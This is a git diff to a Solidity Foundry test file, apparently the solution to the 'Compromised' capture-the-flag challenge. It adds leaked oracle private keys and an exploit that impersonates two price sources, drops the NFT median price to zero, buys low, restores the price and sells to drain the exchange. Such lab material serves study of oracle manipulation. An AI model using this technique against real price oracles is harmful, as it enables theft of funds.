@@ -20,10 +20,9 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
-        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
-        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
+        0x188Ea627E3531Db590e6f1D71ED83628d1933088, // 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
+        0xA417D473c40a4d42BAd35f147c21eEa7973539D8, // 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
         0xab3600bF153A316dE44827e2473056d56B774a40
     ];
     string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
@@ -75,7 +74,44 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        address comp1 = vm.addr(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
+        address comp2 = vm.addr(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
+
+        console.log("Median Price", oracle.getMedianPrice("DVNFT"));
+
+        vm.startPrank(comp1);
+
+        oracle.postPrice("DVNFT", 0);
+
+        vm.startPrank(comp2);
+
+        oracle.postPrice("DVNFT", 0);
+
+        console.log("Manipulater - Median Price", oracle.getMedianPrice("DVNFT"));
+
+        vm.startPrank(player);
+
+        uint256 id = exchange.buyOne{value: 0.0001 ether}();
+
+        console.log("Balance", player.balance);
+
+        vm.startPrank(comp1);
+
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        vm.startPrank(comp2);
+
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        console.log("Back to normal Median Price", oracle.getMedianPrice("DVNFT"));
+
+        vm.startPrank(player);
+
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+
+        (bool s,) = recovery.call{value: INITIAL_NFT_PRICE}("");
+        require(s);
     }
 
     /**
